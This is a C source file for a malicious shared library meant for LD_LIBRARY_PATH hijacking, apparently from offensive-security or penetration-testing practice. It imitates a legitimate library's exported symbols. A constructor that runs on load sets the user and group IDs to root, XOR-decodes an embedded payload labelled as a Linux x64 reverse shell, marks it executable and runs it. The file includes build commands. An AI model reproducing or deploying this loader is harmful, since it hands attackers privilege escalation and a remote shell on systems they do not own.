#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Compile as follows
//gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
//gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// [...output from readelf here...]
int gpgrt_poll;

// XOR-encoded 'linux/x64/shell_reverse_tcp' payload (key: 0xfa)
char buf[] = "\x90\xD3\xA2\x63\x90\xF8\xA5\x90\xFB\xA4\xF5\xFF\xB2\x6D\xB2\x43\xF8\xFA\xFA\xAA\x3A\x52\xCB\x9C\xAB\xB2\x73\x1C\x90\xEA\xA0\x90\xD0\xA2\xF5\xFF\x90\xF9\xA4\xB2\x05\x34\x90\xDB\xA2\xF5\xFF\x8F\x0C\x90\xC1\xA2\x63\xB2\x41\xD5\x98\x93\x94\xD5\x89\x92\xFA\xA9\xB2\x73\x1D\xA8\xAD\xB2\x73\x1C\xF5\xFF\xFA";

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        int buf_len = (int) sizeof(buf);
	int key = 250;
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        int (*ret)() = (int(*)())buf;
        ret();
}
